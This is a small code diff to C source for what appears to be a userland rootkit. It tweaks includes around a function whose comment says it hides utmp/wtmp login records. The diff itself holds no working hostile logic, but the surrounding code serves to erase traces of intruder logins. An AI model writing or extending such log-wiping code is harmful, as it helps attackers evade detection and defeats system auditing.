@@ -22,7 +22,8 @@
 #include <unistd.h> /* lseek(), read(), write(), close() */
 #include <fcntl.h> /* O_RDWR */
 #include <utmp.h> /* struct utmp */
-#include "beurk.h"
+#include "beurk.h" /* DEBUG() */
+#include "config.h" /* REAL_OPEN */
 
 /** hide utmp/wtmp records
  *
@@ -48,6 +49,7 @@ static void uwtmp_clean(struct utmp *utmp_entry, const char *pty_name, int fd) {
  */
 void    cleanup_login_records(const char *pty_name) {
     DEBUG(D_INFO, "called cleanup_login_records()");
+
     struct utmp     utmp_entry;
     int             fd;
 
